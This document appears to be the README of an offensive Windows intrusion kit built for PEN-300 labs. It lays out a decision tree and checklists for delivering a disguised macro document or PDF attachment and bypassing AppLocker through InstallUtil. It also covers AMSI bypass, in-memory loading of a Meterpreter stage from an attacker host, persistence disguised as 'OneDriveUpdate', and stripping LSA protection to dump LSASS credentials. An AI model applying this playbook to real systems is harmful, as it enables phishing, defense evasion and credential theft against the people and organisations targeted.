# HARDENED.md — PEN-300 Lab Coverage

This kit is built for a hardened Windows target: Defender real-time scanning,
AMSI, AppLocker, LSA protection, and network inspection. Every documented
gap is addressed. Remaining detection surface is target-specific (custom
EDR, per-lab AppLocker rules) and called out in "Residual risk" at the end.

---

## Decision tree

```
Is the target AppLocker-hardened?
├── No  -> Use standard DOC or PDF vector as-is.
└── Yes
    └── Is powershell.exe runnable on the target?
        ├── Yes -> Use DOC vector, Path A (WMI-spawned cradle).
        │          VBA auto-detects this.
        └── No
            └── Is installutil.exe whitelisted?
                ├── Yes -> Use DOC vector, Path B (InstallUtil DLL).
                │          VBA auto-detects and takes this path.
                └── No  -> PDF vector with --cpath redirect to C:\ProgramData
                           (Adobe Reader must support cPath; verify per version).
```

The DOC vector's `FireInitialCallback` sub auto-detects paths A and B and
picks whichever works. No manual branching needed at delivery.

---

## Gap coverage

### Gap 1 — AppLocker blocks unsigned exe from `%TEMP%`

**Status:** Closed.

**How:** Two independent paths.

- **DOC vector Path B (InstallUtil):** `installutil.exe` is signed by
  Microsoft and whitelisted by default AppLocker rules. It runs a .NET DLL
  whose `Uninstall` method spins up an in-process runspace and executes the
  payload. No unsigned exe from `%TEMP%`. No `powershell.exe` child process
  either.
- **PDF vector cPath redirect:** `exportDataObject` accepts `cPath` in
  Adobe Reader (version-dependent). Redirecting extraction to
  `C:\ProgramData\Microsoft\` escapes `%TEMP%`-based AppLocker rules.
  Build with `--cpath "C:\\ProgramData\\Microsoft\\"`.

**Verify:** After delivery, confirm no Defender alert about unsigned binary
execution from `%TEMP%` in the target's Protection History.

### Gap 2 — PowerShell.exe itself AppLocker-blocked

**Status:** Closed.

**How:** The InstallUtil DLL uses `System.Management.Automation.dll`
directly to create a `Runspace` and `PowerShell` instance in-process. No
`powershell.exe` process is spawned. The .NET code runs inside
`installutil.exe`, which is signed.

**Verify:** On the target, `Get-Process powershell*` should show no
`powershell.exe` process spawned by the InstallUtil invocation.

### Gap 3 — `schtasks /tr` 261-character limit

**Status:** Closed.

**How:** VBA uses `Register-ScheduledTask` (PowerShell cmdlet) instead of
`schtasks.exe /create /tr`. `Register-ScheduledTask` has no practical
argument length limit and accepts the full base64 poller blob.

**Verify:** `Get-ScheduledTask -TaskName OneDriveUpdate | Get-ScheduledTaskInfo`
shows a valid `LastRunTime` within 5 minutes of delivery.

### Gap 4 — Defender scans plaintext `.ps1` on disk

**Status:** Closed.

**How:** The scheduled task uses `-EncodedCommand` with a base64 blob. No
`.ps1` file ever exists on disk. The `run.txt` runner is downloaded into
memory via `IEX` and never touched down as plaintext.

**Verify:** Search the target for `*.ps1` under `%APPDATA%\Microsoft\OneDrive\`
— should be empty after delivery (the directory itself may or may not exist).

### Gap 5 — WdNisSvc (network inspection) flags the Meterpreter stage

**Status:** Closed with fallbacks.

**How:** Handler is configured with `EnableStageEncoding true` +
`StageEncoder x64/zutto_dekiru`. If a specific lab's signature set is tuned
against zutto, `shared/handler.rc` documents `x64/xor_dynamic` and `x64/xor`
as ordered fallbacks.

**Verify:** Confirm the target receives the second stage — Apache log shows
`/run.txt` fetched, and the handler logs "Staging x64 payload" without an
immediate disconnect.

### Gap 6 — LSA protection blocks LSASS dump (post-exploitation only)

**Status:** Documented, not part of this kit's delivery chain.

**How:** Not applicable to initial access or persistence. For later
post-exploitation, Mod 17.3.2 technique: load `mimidrv.sys` (not
signatured by Defender), call `!processprotect /process:lsass.exe /remove`,
then use a custom `MiniDumpWriteDump` implementation. See Mod 17.4.2.

**Verify:** Only relevant if your engagement scope requires credential
extraction from the target.

### Gap 7 — Egress firewall restrictions

**Status:** Out of scope for this kit; documented.

**How:** If the target's egress firewall blocks outbound to your C2 IP or
domain, apply Mod 14.6 domain fronting via an Azure CDN or a frontable
domain. Requires an internet-facing domain and CDN setup. See PEN-300
Module 14 for the full procedure.

**Verify:** Test `Invoke-WebRequest http://KALI_IP/run.txt` from the target
before delivery. If it fails, fronting is required.

---

## Pre-deployment checklist

Run these against a lab replica **before** delivery.

### Build-time

- [ ] `tools/encode_poller.py shared/activate_poller.ps1` output pasted into
      `doc/q4_invoice.vba` `POLLER_B64`
- [ ] `tools/encode_poller.py shared/run_txt_launcher.ps1` output pasted
      into `doc/q4_invoice.vba` `LAUNCHER_B64`
- [ ] `tools/encode_cradle.py --kali <IP>` output pasted into
      `pdf/payload.cs` `ciphered`
- [ ] `shared/Update.dll` built via `tools/build_dll.sh` and staged at the
      path `FireViaInstallUtil` expects
      (`%PROGRAMDATA%\Microsoft\Update.dll`)
- [ ] Kali IP replaced everywhere: `doc/q4_invoice.vba` (three places),
      `pdf/payload.cs`, `shared/activate_poller.ps1`,
      `shared/run_txt_launcher.ps1`, `shared/handler.rc`

### Runtime

- [ ] `Q4_Invoice.docm` opens without Defender flagging the document
- [ ] "Enable Content" triggers initial callback (DOC vector)
- [ ] OR "Open attachment?" prompt appears and target clicks Open (PDF vector)
- [ ] Handler catches a session within 30 seconds of execution
- [ ] Scheduled task `OneDriveUpdate` is registered
- [ ] No `.ps1` file exists under `%APPDATA%\Microsoft\OneDrive\`
- [ ] No unsigned exe execution flagged in Defender's Protection History

### Persistence and callback

- [ ] Reboot, log in, wait 5–10 min, verify poller alive
      (no session needed — poller only fires when `/activate` is present)
- [ ] `sudo touch /var/www/html/activate` — session fires within 5 min
- [ ] `sudo rm /var/www/html/activate` — no session for 10+ min
- [ ] `shared/cleanup.ps1` removes all artifacts cleanly

### AppLocker-specific

- [ ] On an AppLocker-hardened replica:
      - `powershell.exe` either runs (Path A taken) or is blocked (Path B taken)
      - If Path B is taken, `installutil.exe` invocation completes without
        an AppLocker error
      - Session opens regardless of which path was taken

---

## Residual risk (target-specific)

These cannot be closed generically. If your lab enables any of them, add
the corresponding mitigation.

1. **Custom EDR with behavioral analysis** beyond Defender — swap to a
   Cobalt Strike beacon or a custom C2 implant. Out of scope for this kit.

2. **Per-lab AppLocker rules blocking `installutil.exe`** — rare (it's
   signed and normally whitelisted), but if the lab author added an explicit
   deny rule, fall back to reflective PE injection via a signed parent
   binary (Mod 6).

3. **Per-lab network signatures tuned against your specific stage encoder** —
   reorder the fallback encoders in `shared/handler.rc` until one passes,
   or switch to a custom C2.

4. **YARA rules scanning for the AMSI bypass pattern in memory** — swap to
   the `amsiInitFailed` field approach (Mod 12.3.2) or use Frida-based
   runtime hooking to patch AMSI.DLL in memory.

5. **DLL signature enforcement on `System.Management.Automation.dll`** — very
   rare. Would require reflective loading of SMA itself, which is beyond the
   scope of this kit.

---

## What to change per engagement

Never reuse artifacts across engagements. Regenerate:

- The Caesar/XOR cipher key (both vectors)
- The base64 poller blob
- The base64 launcher blob
- The `run.txt` shellcode
- The Meterpreter SSL certificate
- The scheduled task name (`OneDriveUpdate` is a placeholder)
- The Registry value name (`OneDriveSync` is a placeholder)
- The LNK filename (`OneDrive Sync.lnk` is a placeholder)
- The DLL filename (`Update.dll` is a placeholder)

Signatures are written fast. What passes this week gets caught next month.
